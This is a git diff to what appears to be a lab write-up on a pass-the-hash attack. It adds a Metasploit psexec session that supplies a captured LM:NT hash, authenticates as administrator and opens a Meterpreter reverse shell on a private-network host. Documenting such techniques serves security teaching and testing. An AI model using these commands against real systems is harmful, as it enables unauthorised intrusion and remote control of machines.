@@ -130,3 +130,21 @@ Now we need our hash, Note that the **NT** part of this hash is the most importa
 
 ![](https://i.imgur.com/c8XeAIx.png)
 
+```shell
+msf6 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
+smbpass => aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
+msf6 exploit(windows/smb/psexec) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.157:4444 
+[*] 192.168.0.166:445 - Connecting to the server...
+[*] 192.168.0.166:445 - Authenticating to 192.168.0.166:445 as user 'administrator'...
+[*] 192.168.0.166:445 - Selecting PowerShell target
+[*] 192.168.0.166:445 - Executing the payload...
+[+] 192.168.0.166:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (200774 bytes) to 192.168.0.166
+[*] Meterpreter session 3 opened (192.168.0.157:4444 -> 192.168.0.166:54623) at 2023-09-16 17:47:14 -0400
+
+meterpreter > 
+```
+
+
